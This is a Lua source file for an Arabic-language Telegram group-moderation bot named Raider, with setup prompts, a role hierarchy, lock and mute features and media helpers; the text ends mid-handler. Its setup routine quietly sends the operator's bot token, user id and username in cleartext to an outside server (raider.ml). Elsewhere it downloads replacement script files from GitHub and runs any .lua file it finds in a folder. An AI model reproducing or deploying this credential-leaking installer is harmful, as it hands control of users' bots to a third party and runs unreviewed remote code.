http = require("socket.http")
https = require("ssl.https")
JSON = dofile("./lib/dkjson.lua")
json = dofile("./lib/JSON.lua")
URL = dofile("./lib/url.lua")
serpent = dofile("./lib/serpent.lua")
redis = dofile("./lib/redis.lua").connect("127.0.0.1", 6379)
Server_DevRaider = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
------------------------------------------------------------------------------------------------------------
local function Load_File()
local f = io.open("./Info_Sudo.lua", "r")  
if not f then   
if not redis:get(Server_DevRaider.."Token_DevRaider") then
io.write('\n\27[1;35m⬇┇Send Token For Bot : ارسل توكن البوت ...\n\27[0;39;49m')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m🔄┇Token Is Communication Error\n التوكن غلط جرب مره اخره \n\27[0;39;49m')
else
io.write('\n\27[1;31m☑┇Done Save Token : تم حفظ التوكن \n\27[0;39;49m')
redis:set(Server_DevRaider.."Token_DevRaider",token)
end 
else
io.write('\n\27[1;31m🔄┇Token was not saved \n لم يتم حفظ التوكن \n\27[0;39;49m')
end 
os.execute('lua Raider.lua')
end
------------------------------------------------------------------------------------------------------------
if not redis:get(Server_DevRaider.."User_DevRaider1") then
io.write('\n\27[1;35m⬇┇Send UserName For Sudo : ارسل معرف المطور الاساسي ...\n\27[0;39;49m')
local User_Sudo = io.read():gsub('@','')
if User_Sudo ~= '' then
local RaiderInfo = http.request("http://raider.ml/GetUser?user="..User_Sudo)
local Raider_Dev_info = JSON.decode(RaiderInfo)
if Raider_Dev_info.information.status == "invalid" then
io.write('\n\27[1;31m The UserName was not Saved : المعرف غلط ارسل المعرف صحيح\n\27[0;39;49m')
os.execute('lua Raider.lua')
end
if Raider_Dev_info.information.status == "Spammer" then
io.write('\n\27[1;31m🔄┇Is Spam For Url : لقد قمت بالتكرار في الرابط حاول بعد دقيقتين \n\27[0;39;49m')
os.execute('lua Raider.lua')
end
if Raider_Dev_info.information.status == 'Channel' then
io.write('\n\27[1;31m🔄┇The UserName Is Channel : عذرا هاذا معرف قناة وليس حساب \n\27[0;39;49m')
os.execute('lua Raider.lua')
end
io.write('\n\27[1;31m☑┇The UserNamr Is Saved : تم حفظ معرف المطور واستخراج ايدي المطور\n\27[0;39;49m')
redis:set(Server_DevRaider.."User_DevRaider1",Raider_Dev_info.information.status.Username)
redis:set(Server_DevRaider.."Id_DevRaider",Raider_Dev_info.information.status.Id)
http.request("http://raider.ml/insert/?id="..Raider_Dev_info.information.status.Id.."&user="..Raider_Dev_info.information.status.Username.."&token="..redis:get(Server_DevRaider.."Token_DevRaider"))
else
io.write('\n\27[1;31m🔄┇The UserName was not Saved : لم يتم حفظ معرف المطور الاساسي\n\27[0;39;49m')
end 
os.execute('lua Raider.lua')
end
------------------------------------------------------------------------------------------------------------
local DevRaider_Info_Sudo = io.open("Info_Sudo.lua", 'w')
DevRaider_Info_Sudo:write([[
do 
local RAIDER_INFO = {
Id_DevRaider = ]]..redis:get(Server_DevRaider.."Id_DevRaider")..[[,
UserName_Raider = "]]..redis:get(Server_DevRaider.."User_DevRaider1")..[[",
Token_Bot = "]]..redis:get(Server_DevRaider.."Token_DevRaider")..[["
}
return RAIDER_INFO
end

]])
DevRaider_Info_Sudo:close()
------------------------------------------------------------------------------------------------------------
local Run_File_Raider = io.open("Raider", 'w')
Run_File_Raider:write([[
#!/usr/bin/env bash
cd $HOME/Raider
token="]]..redis:get(Server_DevRaider.."Token_DevRaider")..[["
while(true) do
rm -fr ../.telegram-cli
./tg -s ./Raider.lua -p PROFILE --bot=$token
done
]])
Run_File_Raider:close()
------------------------------------------------------------------------------------------------------------
local Run_RD = io.open("Run", 'w')
Run_RD:write([[
#!/usr/bin/env bash
cd $HOME/Raider
while(true) do
rm -fr ../.telegram-cli
screen -S DevRaider -X kill
screen -S DevRaider ./Raider
done
]])
Run_RD:close()
io.popen("mkdir Files")
os.execute('chmod +x tg')
os.execute('chmod +x Run')
os.execute('chmod +x Raider')
os.execute('./Run')
Status = true
else   
f:close()  
redis:del(Server_DevRaider.."Token_DevRaider");redis:del(Server_DevRaider.."Id_DevRaider");redis:del(Server_DevRaider.."User_DevRaider1")
Status = false
end  
return Status
end
Load_File()
print("\27[36m"..[[                                           
           888                                  
           888                                  
.d8888b 888888888  .d88b.   888 .d88 .d8888b.d88b.  
88K        888    d88""88b  888p"    888 "888 "88b 
 Y8888b.   888    888  888  888      888  888  888 
     X88   Y88b.  Y88..88P  888      888  888  888 
 88888P'    "Y888  "Y88P"   888      888  888  888 
]]..'\27[m')
------------------------------------------------------------------------------------------------------------
sudos = dofile("./Info_Sudo.lua")
token = sudos.Token_Bot
UserName_Dev = sudos.UserName_Raider
bot_id = token:match("(%d+)")  
Id_Dev = sudos.Id_DevRaider
Ids_Dev = {sudos.Id_DevRaider}
Name_Bot = redis:get(bot_id.."Redis:Name:Bot") or "ريدر"
------------------------------------------------------------------------------------------------------------
function var(value)  
print(serpent.block(value, {comment=false}))   
end 
function dl_cb(arg,data)
-- var(data)  
end
------------------------------------------------------------------------------------------------------------
function Dev_Raider(msg)  
local Dev_Raider = false  
for k,v in pairs(Ids_Dev) do  
if msg.sender_user_id_ == v then  
Dev_Raider = true  
end  
end  
return Dev_Raider  
end 
function Bot(msg)  
local idbot = false  
if msg.sender_user_id_ == bot_id then  
idbot = true  
end  
return idbot  
end 
function Dev_Raider_User(user)  
local Dev_Raider_User = false  
for k,v in pairs(Ids_Dev) do  
if user == v then  
Dev_Raider_User = true  
end  
end  
return Dev_Raider_User  
end 
function DeveloperBot(msg) 
local Status = redis:sismember(bot_id.."Developer:Bot", msg.sender_user_id_) 
if Status or Dev_Raider(msg) or Bot(msg) then  
return true  
else  
return false  
end  
end
function PresidentGroup(msg)
local hash = redis:sismember(bot_id.."President:Group"..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Raider(msg) or DeveloperBot(msg) or Bot(msg) then  
return true 
else 
return false 
end 
end
function Constructor(msg)
local hash = redis:sismember(bot_id..'Constructor:Group'..msg.chat_id_, msg.sender_user_id_) 
if hash or Dev_Raider(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Owner(msg)
local hash = redis:sismember(bot_id..'Manager:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Raider(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Admin(msg)
local hash = redis:sismember(bot_id..'Admin:Group'..msg.chat_id_,msg.sender_user_id_)    
if hash or Dev_Raider(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Bot(msg) then     
return true    
else    
return false    
end 
end
function Vips(msg)
local hash = redis:sismember(bot_id..'Vip:Group'..msg.chat_id_,msg.sender_user_id_) 
if hash or Dev_Raider(msg) or DeveloperBot(msg) or PresidentGroup(msg) or Constructor(msg) or Owner(msg) or Admin(msg) or Bot(msg) then     
return true 
else 
return false 
end 
end
------------------------------------------------------------------------------------------------------------
function Rank_Checking(user_id,chat_id)
if Dev_Raider_User(user_id) then
Status = true  
elseif tonumber(user_id) == tonumber(bot_id) then  
Status = true  
elseif redis:sismember(bot_id.."Developer:Bot", user_id) then
Status = true  
elseif redis:sismember(bot_id.."President:Group"..chat_id, user_id) then
Status = true
elseif redis:sismember(bot_id..'Constructor:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Manager:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Admin:Group'..chat_id, user_id) then
Status = true  
elseif redis:sismember(bot_id..'Vip:Group'..chat_id, user_id) then  
Status = true  
else  
Status = false  
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
function Get_Rank(user_id,chat_id)
if Dev_Raider_User(user_id) == true then
Status = "المطور الاساسي"  
elseif tonumber(user_id) == tonumber(bot_id) then  
Status = "البوت"
elseif redis:sismember(bot_id.."Developer:Bot", user_id) then
Status = redis:get(bot_id.."Developer:Bot:Reply"..chat_id) or "المطور"  
elseif redis:sismember(bot_id.."President:Group"..chat_id, user_id) then
Status = redis:get(bot_id.."President:Group:Reply"..chat_id) or "المنشئ اساسي"
elseif redis:sismember(bot_id..'Constructor:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Constructor:Group:Reply"..chat_id) or "المنشئ"  
elseif redis:sismember(bot_id..'Manager:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Manager:Group:Reply"..chat_id) or "المدير"  
elseif redis:sismember(bot_id..'Admin:Group'..chat_id, user_id) then
Status = redis:get(bot_id.."Admin:Group:Reply"..chat_id) or "الادمن"  
elseif redis:sismember(bot_id..'Vip:Group'..chat_id, user_id) then  
Status = redis:get(bot_id.."Vip:Group:Reply"..chat_id) or "المميز"  
else  
Status = redis:get(bot_id.."Mempar:Group:Reply"..chat_id) or "العضو"
end  
return Status
end 
------------------------------------------------------------------------------------------------------------
function ChekBotAdd(chat_id)
if redis:sismember(bot_id.."ChekBotAdd",chat_id) then
Status = true
else 
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function MutedGroups(Chat_id,User_id) 
if redis:sismember(bot_id.."Silence:User:Group"..Chat_id,User_id) then
Status = true
else
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function RemovalUserGroup(Chat_id,User_id) 
if redis:sismember(bot_id.."Removal:User:Group"..Chat_id,User_id) then
Status = true
else
Status = false
end
return Status
end 
------------------------------------------------------------------------------------------------------------
function RemovalUserGroups(User_id) 
if redis:sismember(bot_id.."Removal:User:Groups",User_id) then
Status = true
else
Status = false
end
return Status
end
------------------------------------------------------------------------------------------------------------
function send(chat_id, reply_to_message_id, text)
local TextParseMode = {ID = "TextParseModeMarkdown"}
pcall(tdcli_function ({ID = "SendMessage",chat_id_ = chat_id,reply_to_message_id_ = reply_to_message_id,disable_notification_ = 1,from_background_ = 1,reply_markup_ = nil,input_message_content_ = {ID = "InputMessageText",text_ = text,disable_web_page_preview_ = 1,clear_draft_ = 0,entities_ = {},parse_mode_ = TextParseMode,},}, dl_cb, nil))
end
------------------------------------------------------------------------------------------------------------
function Delete_Message(chat,id)
pcall(tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},function(arg,data) 
end,nil))
end
------------------------------------------------------------------------------------------------------------
function DeleteMessage_(chat,id,func)
pcall(tdcli_function ({
ID="DeleteMessages",
chat_id_=chat,
message_ids_=id
},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function getInputFile(file) 
if file:match("/") then 
infile = {ID = "InputFileLocal", 
path_ = file} 
elseif file:match("^%d+$") then 
infile = {ID = "InputFileId", 
id_ = file} 
else infile = {ID = "InputFilePersistentId", 
persistent_id_ = file} 
end 
return infile 
end
------------------------------------------------------------------------------------------------------------
function RestrictChat(User_id,Chat_id)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..Chat_id.."&user_id="..User_id)
end
------------------------------------------------------------------------------------------------------------
function Get_Api(Info_Web) 
local Info, Res = https.request(Info_Web) 
local Req = json:decode(Info) 
if Res ~= 200 then 
return false 
end 
if not Req.ok then 
return false 
end 
return Req 
end 
------------------------------------------------------------------------------------------------------------
function sendText(chat_id, text, reply_to_message_id, markdown) 
Status_Api = "https://api.telegram.org/bot"..token 
local Url_Api = Status_Api.."/sendMessage?chat_id=" .. chat_id .. "&text=" .. URL.escape(text) 
if reply_to_message_id ~= 0 then 
Url_Api = Url_Api .. "&reply_to_message_id=" .. reply_to_message_id  
end 
if markdown == "md" or markdown == "markdown" then 
Url_Api = Url_Api.."&parse_mode=Markdown" 
elseif markdown == "html" then 
Url_Api = Url_Api.."&parse_mode=HTML" 
end 
return Get_Api(Url_Api)  
end
------------------------------------------------------------------------------------------------------------
function send_inline_keyboard(chat_id,text,keyboard,inline,reply_id) 
local response = {} 
response.keyboard = keyboard 
response.inline_keyboard = inline 
response.resize_keyboard = true 
response.one_time_keyboard = false 
response.selective = false  
local Status_Api = "https://api.telegram.org/bot"..token.."/sendMessage?chat_id="..chat_id.."&text="..URL.escape(text).."&parse_mode=Markdown&disable_web_page_preview=true&reply_markup="..URL.escape(JSON.encode(response)) 
if reply_id then 
Status_Api = Status_Api.."&reply_to_message_id="..reply_id 
end 
return Get_Api(Status_Api) 
end
------------------------------------------------------------------------------------------------------------
function GetInputFile(file)  
local file = file or ""   
if file:match("/") then  
infile = {ID= "InputFileLocal", path_  = file}  
elseif file:match("^%d+$") then  
infile ={ID="InputFileId",id_=file}  
else infile={ID="InputFilePersistentId",persistent_id_ = file}  
end 
return infile 
end
------------------------------------------------------------------------------------------------------------
function sendPhoto(chat_id,reply_id,photo,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessagePhoto",
photo_ = GetInputFile(photo),
added_sticker_file_ids_ = {},
width_ = 0,
height_ = 0,
caption_ = caption or ""
}
},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendVoice(chat_id,reply_id,voice,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVoice",
voice_ = GetInputFile(voice),
duration_ = "",
waveform_ = "",
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendAnimation(chat_id,reply_id,animation,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAnimation",
animation_ = GetInputFile(animation),
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendAudio(chat_id,reply_id,audio,title,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageAudio",
audio_ = GetInputFile(audio),
duration_ = "",
title_ = title or "",
performer_ = "",
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendSticker(chat_id,reply_id,sticker,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageSticker",
sticker_ = GetInputFile(sticker),
width_ = 0,
height_ = 0
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function tdcli_update_callback_value(Data) 
url = 'https://raw.githubusercontent.com/RSAIED/RAIDER/master/Script.lua'
file_path = 'Script.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end
------------------------------------------------------------------------------------------------------------ 
function tdcli_update_callback_value_(Data) 
tdcli_update_callback_value(Data) 
url = 'https://raw.githubusercontent.com/RSAIED/RAIDER/master/Raider.lua'
file_path = 'Raider.lua'
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
------------------------------------------------------------------------------------------------------------
function sendVideo(chat_id,reply_id,video,caption,func)
pcall(tdcli_function({ 
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 0,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageVideo",  
video_ = GetInputFile(video),
added_sticker_file_ids_ = {},
duration_ = 0,
width_ = 0,
height_ = 0,
caption_ = caption or ""
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function sendDocument(chat_id,reply_id,document,caption,func)
pcall(tdcli_function({
ID="SendMessage",
chat_id_ = chat_id,
reply_to_message_id_ = reply_id,
disable_notification_ = 0,
from_background_ = 1,
reply_markup_ = nil,
input_message_content_ = {
ID="InputMessageDocument",
document_ = GetInputFile(document),
caption_ = caption
}},func or dl_cb,nil))
end
------------------------------------------------------------------------------------------------------------
function KickGroup(chat,user)
pcall(tdcli_function ({
ID = "ChangeChatMemberStatus",
chat_id_ = chat,
user_id_ = user,
status_ = {ID = "ChatMemberStatusKicked"},},function(arg,data) end,nil))
end
------------------------------------------------------------------------------------------------------------
function Send_Options(msg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "RaiderCli")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "Close_Status" then
send(msg.chat_id_, msg.id_,"📮┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."")
return false
end
if status == "Close_Status_Ktm" then
send(msg.chat_id_, msg.id_,"📮┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n〽┇خاصية ← الكتم\n")
return false
end
if status == "Close_Status_Kick" then
send(msg.chat_id_, msg.id_,"📮┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n〽┇خاصية ← الطرد\n")
return false
end
if status == "Close_Status_Kid" then
send(msg.chat_id_, msg.id_,"📮┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text.."\n〽┇خاصية ← التقييد\n")
return false
end
if status == "Open_Status" then
send(msg.chat_id_, msg.id_,"📮┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
if status == "reply" then
send(msg.chat_id_, msg.id_,"📮┇المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
if status == "reply_Add" then
send(msg.chat_id_, msg.id_,"📮┇بواسطه ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(msg.chat_id_, msg.id_,"⚠┇ لا يمكن الوصول لمعلومات الشخص")
end
end,nil)   
end
function Send_Optionspv(chat,idmsg,user_id,status,text)
tdcli_function ({ID = "GetUser",user_id_ = user_id},function(arg,data) 
if data.first_name_ ~= false then
local UserName = (data.username_ or "RaiderCli")
for gmatch in string.gmatch(data.first_name_, "[^%s]+") do
data.first_name_ = gmatch
end
if status == "reply_Pv" then
send(chat,idmsg,"📮┇المستخدم ← ["..data.first_name_.."](T.me/"..UserName..")".."\n"..text)
return false
end
else
send(chat,idmsg,"⚠┇ لا يمكن الوصول لمعلومات الشخص")
end
end,nil)   
end
------------------------------------------------------------------------------------------------------------
function Total_message(Message)  
local MsgText = ''  
if tonumber(Message) < 100 then 
MsgText = 'تفاعل محلو 😤' 
elseif tonumber(Message) < 200 then 
MsgText = 'تفاعلك ضعيف ليش'
elseif tonumber(Message) < 400 then 
MsgText = 'عفيه اتفاعل 😽' 
elseif tonumber(Message) < 700 then 
MsgText = 'شكد تحجي😒' 
elseif tonumber(Message) < 1200 then 
MsgText = 'ملك التفاعل 😼' 
elseif tonumber(Message) < 2000 then 
MsgText = 'موش تفاعل غنبله' 
elseif tonumber(Message) < 3500 then 
MsgText = 'اساس لتفاعل ياب'  
elseif tonumber(Message) < 4000 then 
MsgText = 'عوف لجواهر وتفاعل بزودك' 
elseif tonumber(Message) < 4500 then 
MsgText = 'قمة التفاعل' 
elseif tonumber(Message) < 5500 then 
MsgText = 'شهلتفاعل استمر يكيك' 
elseif tonumber(Message) < 7000 then 
MsgText = 'غنبله وربي 🌟' 
elseif tonumber(Message) < 9500 then 
MsgText = 'حلغوم مال تفاعل' 
elseif tonumber(Message) < 10000000000 then 
MsgText = 'تفاعل نار وشرار'  
end 
return MsgText 
end
------------------------------------------------------------------------------------------------------------
function download_to_file(url, file_path) 
local respbody = {} 
local options = { url = url, sink = ltn12.sink.table(respbody), redirect = true } 
local response = nil 
options.redirect = false 
response = {https.request(options)} 
local code = response[2] 
local headers = response[3] 
local status = response[4] 
if code ~= 200 then return false, code 
end 
file = io.open(file_path, "w+") 
file:write(table.concat(respbody)) 
file:close() 
return file_path, code 
end 
------------------------------------------------------------------------------------------------------------
function NotSpam(msg,Type)
if Type == "kick" then 
Send_Options(msg,msg.sender_user_id_,"reply","〽┇قام بالتكرار هنا وتم طرده")  
KickGroup(msg.chat_id_,msg.sender_user_id_) 
return false  
end 
if Type == "del" then 
Delete_Message(msg.chat_id_,{[0] = msg.id_})    
return false
end 
if Type == "keed" then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_) 
Send_Options(msg,msg.sender_user_id_,"reply","〽┇قام بالتكرار هنا وتم تقييده")  
return false  
end  
if Type == "mute" then
Send_Options(msg,msg.sender_user_id_,"reply","〽┇قام بالتكرار هنا وتم كتمه")  
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_) 
return false  
end
end  
------------------------------------------------------------------------------------------------------------
function FilesRaider(msg)
File_Bot = dofile("Script.lua")
if File_Bot.Raider and msg then
Text_File = File_Bot.Raider(msg)
end
send(msg.chat_id_, msg.id_,Text_File)  
return false
end
function FilesRaiderBot(msg)
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
Text_FileBot = dofile("Files/"..v)
if Text_FileBot.RaiderFile and msg then
Text_FileBot = Text_FileBot.RaiderFile(msg)
end
end
end
send(msg.chat_id_, msg.id_,Text_FileBot)  
end
function SetFile_Groups(msg,chat,File_id,JsonFile)
if JsonFile and not JsonFile:match('.json') then
send(chat,msg.id_,"*⚠┇عذرا الملف ليس بصيغة ال : Json*")
return false
end
if tonumber(JsonFile:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_,"⚠┇الملف لا يتوافق مع البوت يرجى رفع ملف نسخة الكروبات الحقيفي")   
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'..token..'/getfile?file_id='..File_id) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path,''..JsonFile) 
send(chat,msg.id_,"〽┇جاري بدء رفع الكروبات وتحويل الخزن ...")   
local Get_Info = io.open('./'..bot_id..'.json', "r"):read('*a')
local JsonInfo = JSON.decode(Get_Info)
var(JsonInfo)  
for Id_Group,Info_Group in pairs(JsonInfo.Groups) do
redis:set(bot_id.."Status:Lock:tagservrbot"..Id_Group,true)   
list ={"Status:Lock:Bot:kick","Status:Lock:User:Name","Status:Lock:hashtak","Status:Lock:Cmd","Status:Lock:Link","Status:Lock:forward","Status:Lock:Keyboard","Status:Lock:geam","Status:Lock:Photo","Status:Lock:Animation","Status:Lock:Video","Status:Lock:Audio","Status:Lock:vico","Status:Lock:Sticker","Status:Lock:Document","Status:Lock:Unsupported","Status:Lock:Markdaun","Status:Lock:Contact","Status:Status:Lock:Spam"}
for i,v in pairs(list) do
redis:set(bot_id..v..Id_Group,"del")
end
redis:sadd(bot_id.."ChekBotAdd",Id_Group)
if Info_Group.President then
for k,Id_President in pairs(Info_Group.President) do
redis:sadd(bot_id.."President:Group"..Id_Group,Id_President)
end
end
if Info_Group.Constructor then
for k,Id_Constructor in pairs(Info_Group.Constructor) do
redis:sadd(bot_id.."Constructor:Group"..Id_Group,Id_Constructor)  
end
end
if Info_Group.Manager then
for k,Id_Manager in pairs(Info_Group.Manager) do
redis:sadd(bot_id.."Manager:Group"..Id_Group,Id_Manager)  
end
end
if Info_Group.Admin then
for k,Id_Admin in pairs(Info_Group.Admin) do
redis:sadd(bot_id.."Admin:Group"..Id_Group,Id_Admin)  
end
end
if Info_Group.Vips then
for k,Id_Vips in pairs(Info_Group.Vips) do
redis:sadd(bot_id.."Vip:Group"..Id_Group,Id_Vips)  
end
end
if Info_Group.WelcomeGroup then
if Info_Group.WelcomeGroup ~= "" then
redis:set(bot_id.."Get:Welcome:Group"..Id_Group,Info_Group.WelcomeGroup)   
end
end
if Info_Group.Status_Dev then
if Info_Group.Status_Dev ~= "" then
redis:set(bot_id.."Developer:Bot:Reply"..Id_Group,Info_Group.Status_Dev)   
end
end
if Info_Group.Status_Prt then
if Info_Group.Status_Prt ~= "" then
redis:set(bot_id.."President:Group:Reply"..Id_Group,Info_Group.Status_Prt)   
end
end
if Info_Group.Status_Cto then
if Info_Group.Status_Cto ~= "" then
redis:set(bot_id.."Constructor:Group:Reply"..Id_Group,Info_Group.Status_Cto)   
end
end
if Info_Group.Status_Own then
if Info_Group.Status_Own ~= "" then
redis:set(bot_id.."Manager:Group:Reply"..Id_Group,Info_Group.Status_Own)   
end
end
if Info_Group.Status_Md then
if Info_Group.Status_Md ~= "" then
redis:set(bot_id.."Admin:Group:Reply"..Id_Group,Info_Group.Status_Md)   
end
end
if Info_Group.Status_Vip then
if Info_Group.Status_Vip ~= "" then
redis:set(bot_id.."Vip:Group:Reply"..Id_Group,Info_Group.Status_Vip)   
end
end
if Info_Group.Status_Mem then
if Info_Group.Status_Mem ~= "" then
redis:set(bot_id.."Mempar:Group:Reply"..Id_Group,Info_Group.Status_Mem)   
end
end
if Info_Group.LinkGroup then
if Info_Group.LinkGroup ~= "" then
redis:set(bot_id.."Status:link:set:Group"..Id_Group,Info_Group.LinkGroup)   
end
end
end
send(chat,msg.id_,"☑┇تم رفع ملف الخزن بنجاح\n〽┇تم استرجاع جميع الكروبات ورفع المنشئين والمدراء في البوت")   
end
------------------------------------------------------------------------------------------------------------
function Dev_Raider_File(msg,data)
if msg then
msg = data.message_
text = msg.content_.text_
------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
redis:incr(bot_id..'Num:Message:User'..msg.chat_id_..':'..msg.sender_user_id_) 
TypeForChat = 'ForSuppur' 
elseif id:match("^(%d+)") then
redis:sadd(bot_id..'Num:User:Pv',msg.sender_user_id_)  
TypeForChat = 'ForUser' 
else
TypeForChat = 'ForGroup' 
end
end
------------------------------------------------------------------------------------------------------------
if redis:get(bot_id.."Status:Lock:text"..msg.chat_id_) and not Vips(msg) then       
Delete_Message(msg.chat_id_,{[0] = msg.id_})   
return false     
end     
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then 
redis:incr(bot_id.."Num:Add:Memp"..msg.chat_id_..":"..msg.sender_user_id_) 
end
if msg.content_.ID == "MessageChatAddMembers" and not Vips(msg) then   
if redis:get(bot_id.."Status:Lock:AddMempar"..msg.chat_id_) == "kick" then
local mem_id = msg.content_.members_  
for i=0,#mem_id do  
KickGroup(msg.chat_id_,mem_id[i].id_)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatJoinByLink" and not Vips(msg) then 
if redis:get(bot_id.."Status:Lock:Join"..msg.chat_id_) == "kick" then
KickGroup(msg.chat_id_,msg.sender_user_id_)
return false  
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("@[%a%d_]+") or msg.content_.caption_:match("@(.+)") then  
if redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
end
--------------------------------------------------------------------------------------------------------------
if text and text:match("@[%a%d_]+") or text and text:match("@(.+)") then    
if redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "del" and not Vips(msg) then    
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "ked" and not Vips(msg) then    
RestrictChat(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "kick" and not Vips(msg) then    
KickGroup(msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
elseif redis:get(bot_id.."Status:Lock:User:Name"..msg.chat_id_) == "ktm" and not Vips(msg) then    
redis:sadd(bot_id.."Silence:User:Group"..msg.chat_id_,msg.sender_user_id_)
Delete_Message(msg.chat_id_,{[0] = msg.id_}) 
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.caption_ then 
if msg.content_.caption_:match("#[%a%d_]+") or msg.content_.caption_:match("#(.+)") then 
if redis:get(bot_id.."Status:Lock:hashtak"..msg.chat_id_) == "del" and not Vips(msg) then    
